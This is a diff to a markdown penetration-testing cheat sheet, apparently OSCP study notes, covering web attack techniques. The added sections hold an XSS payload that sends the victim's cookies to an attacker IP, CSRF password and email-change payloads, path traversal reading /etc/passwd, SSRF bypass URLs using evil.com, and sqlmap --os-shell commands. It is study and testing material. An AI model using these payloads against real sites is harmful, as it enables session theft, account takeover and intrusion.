@@ -2,12 +2,24 @@
 
 ## XSS
 
+> [PayloadsAllTheThings > XSS](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)
+
 - Locate areas accepting user input (e.g., forms, URL parameters, headers, cookies).
 - Note how inputs are reflected in the application's response or processed.
 - Use URL, Base64, or HTML encoding to bypass filters.
 - Test variations like `<img src=x onerror=alert(1)>`.
 
+```html
+<!-- XSS + CSRF -->
+<img src=x onerror=this.src="http://<ip>/change_pass.php?password=123123&confirm_password=123123&submit=submit">
+
+<!-- get user's cookies -->
+<img src=x onerror=this.src="http://<ip>/?c="+document.cookie>
+```
+
 ## Path Traversal
+
+> [PayloadsAllTheThings > Path Traversal](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/)
 
 !!! tip
     🍪 Don't forget the `--path-as-is` curl param
@@ -33,6 +45,8 @@ curl --path-as-is "http://<url>/index.php?page=../../../etc/passwd"
 ```
 
 ## File Inclusion Vulnerabilities
+
+> [PayloadsAllTheThings > File Inclusion](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
 
 ### Local
 
@@ -133,6 +147,8 @@ curl http://<url>/index.php?page=http://<local_ip>/shell.php
 
 ## File Upload
 
+> [PayloadsAllTheThings > File Upload](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)
+
 - Rename files to bypass uploader logic such as `.phps, .php7, .pHP, .png.php, .php%20`
 - If the validation is on the front, the request can be altered with Caido/Burp changing the extension.
 
@@ -183,6 +199,8 @@ ssh -i fileup -p 2222 root@mountaindesserts.com
 
 ## Command Injection
 
+> [PayloadsAllTheThings > Command Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/)
+
 - Common separators: `& && || ;`
 - Try encoded symbols: `%3B`
 - Try terminating quoted context before the command: `'; whoami` `"&& whoami` `"& whoami"`
@@ -206,7 +224,7 @@ curl -X POST -d 'Archive=git%3Biwr%28%22http%3A%2F%2F192.168.45.230%2Fpowercat.p
 ## SQL Injection
 
 > [Portswigger cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-> [PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+> [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)
 
 ### DB basic recon
 
@@ -242,7 +260,8 @@ select * from offsec.dbo.users;
 
 ### Testing
 
-> <https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt>
+!!! tip
+    📜 Recommended wordlists: `/usr/share/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt`
 
 ```shell
 ' OR '1
@@ -323,8 +342,60 @@ SQL> xp_cmdshell whoami
     Not allowed in OSCP exam
 
 ```shell
-sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
-sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+sqlmap -u http://<ip>/blindsqli.php?user=1 -p user
+sqlmap -u http://<ip>/blindsqli.php?user=1 -p user --dump
 # using a POST request, get a shell
 sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
+```
+
+## SSRF (Server-Side Request Forgery)
+
+> [PayloadsAllTheThings > SSRF](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/)
+
+> <https://app.requestbin.net>
+
+- Identify features that fetch remote resources (e.g., URL preview, PDF generation, image fetchers) and capture interactions with tools like Burp Collaborator, requestbin.net, canarytokens.org/generate, etc.
+- Test with internal IPs and localhost:
+
+    - `http://127.0.0.1`
+    - `http://localhost`
+    - `http://[::1]`
+
+- Try different URL encodings and bypasses:
+
+    - `http://127.0.0.1%2Fetc%2Fpasswd`
+    - `http://127.0.0.1:80`
+    - `http://127.0.0.1@evil.com`
+    - `http://localhost#@evil.com`
+    - `http://0x7f000001`
+    - `http://2130706433`
+
+- Check for SSRF via POST body, headers, or file uploads.
+- Abuse SSRF to:
+
+    - Access internal admin panels or APIs.
+    - Read files via file://, dict://, gopher://, ftp://, etc.
+    - Trigger internal services (Redis, GCP/AWS metadata endpoints).
+    - Enumerate internal ports.
+
+- Use open redirect endpoints to chain SSRF if direct access is blocked.
+
+## XSRF (Cross-Site Request Forgery)
+
+>[PayloadsAllTheThings > XSRF](https://swisskyrepo.github.io/PayloadsAllTheThings/Cross-Site%20Request%20Forgery/)
+
+1. Identify state-changing actions that lack CSRF protection (e.g., no CSRF token, no SameSite cookies).
+2. Craft a malicious HTML form or request that submits data to the vulnerable endpoint.
+3. Trick the victim into executing the request while authenticated.
+
+```shell
+http://<url>/change_password?password=1234&retype=1234&submit=1
+```
+
+```html
+<!-- Auto-submitting form -->
+<form action="http://target.com/change_email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+</form>
+<script>document.forms[0].submit();</script>
 ```
